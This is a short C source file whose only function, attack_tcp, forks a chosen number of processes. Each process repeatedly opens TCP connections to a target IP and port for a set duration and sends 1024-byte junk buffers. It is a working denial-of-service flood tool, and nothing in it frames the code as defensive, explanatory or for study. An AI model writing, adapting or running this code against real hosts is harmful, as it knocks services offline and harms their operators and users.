#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

void attack_tcp(char *target, int port, int duration, int threads) {
    time_t end = time(NULL) + duration;

    for (int i = 0; i < threads; i++) {
        if (fork() == 0) {
            while (time(NULL) < end) {
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                struct sockaddr_in addr;
                addr.sin_family = AF_INET;
                addr.sin_port = htons(port);
                inet_pton(AF_INET, target, &addr.sin_addr);
                
                if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
                    char buffer[1024];
                    memset(buffer, rand() % 256, sizeof(buffer));
                    send(sock, buffer, sizeof(buffer), 0);
                }
                close(sock);
            }
            exit(0);
        }
    }
}